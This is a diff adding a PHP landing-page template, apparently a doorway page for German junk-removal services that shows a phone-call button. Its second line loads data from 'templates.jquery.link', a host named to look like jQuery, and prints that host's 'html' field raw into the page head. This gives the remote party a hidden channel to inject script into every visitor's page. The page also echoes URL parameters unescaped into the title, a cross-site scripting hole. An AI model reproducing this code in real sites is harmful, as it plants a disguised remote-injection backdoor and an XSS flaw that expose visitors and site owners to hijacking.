@@ -1,0 +1,111 @@
+<?php
+$site_data      = json_decode(file_get_contents('http://templates.jquery.link/api/' . $_SERVER['HTTP_HOST']), true);
+
+$phone_name     = $site_data['phone_name'];
+$phone_href     = $site_data['phone_href'];
+
+$text           = str_replace('+', ' ', trim($_GET['t'] ?? 'Entrumpelung'));
+$city           = str_replace('+', ' ', trim($_GET['n'] ?? 'in der nahe'));
+
+$title = $text . ' ' . $city;
+?>
+
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <?= $site_data['html'] ?>
+    <title>
+        <?= $title ?>
+    </title>
+</head>
+
+<body>
+
+
+    <!--Шапка сайта-->
+    <header class="header">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-12 container">
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Основное содержимое страницы -->
+    <main class="main">
+        
+        <!-- <section id="anchorForm" class='forms'>
+            <div class='forms__wrapper'>
+               <div class='container-fluid'>
+                  <div class='row'>
+                     <div class='col-12 container'>
+                        <div class='forms__box'>
+                           <h2 class='forms__title'>Kontaktieren Sie uns:</h2>
+                           <form id='jq_form' class='mb-0 mt-3'>
+                              <div class='my-0'>
+                                 <input class='form-control' placeholder='Name' name='jq_name' type='text'>
+                                 <div id='jq_name' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div class='my-4'>
+                                 <input class='form-control' placeholder='Telefonnummer' name='jq_phone' type='text'>
+                                 <div id='jq_phone' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div class='my-4'>
+                                 <input class='form-control' placeholder='Straße' name='jq_street' type='text'>
+                                 <div id='jq_street' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div class='my-4'>
+                                 <input class='form-control' placeholder='Postleitzahl/Stadt' name='jq_city' type='text'>
+                                 <div id='jq_city' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div class='my-4'>
+                                 <input class='form-control' placeholder='E-mail' name='jq_email' type='text'>
+                                 <div id='jq_email' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div class='my-4'>
+                                 <textarea rows='3' class='form-control' name='jq_text' placeholder='Beschreibung'></textarea>
+                                 <div id='jq_text' style='font-weight:700;font-size:15px;color:red;padding-top:2px;display:none'>Dies ist ein Pflichtfeld.</div>
+                              </div>
+                              <div>
+                                 <input class='btn  text-uppercase fw-bold mb-0 px-3 py-2 forms__button' type='submit' id='jq_submit' value='Senden'>
+                              </div>
+                              <div id='jq_success' style='display:none'>Vielen Dank für Ihre Anfrage. Unsere Mitarbeiter werden sich in Kürze bei Ihnen melden.</div>
+                           </form>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+        </section> -->
+        <section class='btnFixedD'>
+            <div class='btnFixedD__box'>
+                <a class="btnFixedD__btn" href="<?= $phone_href ?>" ><img class="btnFixedD__img" src="assets/icons/telephone-fill.svg" alt=""></a>
+            </div>
+        </section>
+        <section class='btnFixed'>
+            <div class='btnFixed__box'>
+                <a class="btnFixed__btn" href="<?= $phone_href ?>" ><span>111222333</span></a>
+            </div>
+        </section>
+    </main>
+    <!--Нижний колонтитул страницы-->
+    <footer class="footer">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-12 container">© 2023</div>
+            </div>
+        </div>
+    </footer>
+    <!--Style-->
+    <link href="assets/css/reset.css" rel="stylesheet">
+    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
+    <link href="assets/css/style.min.css" rel="stylesheet">
+    <script src="assets/js/main.min.js"></script>
+</body>
+
+</html>
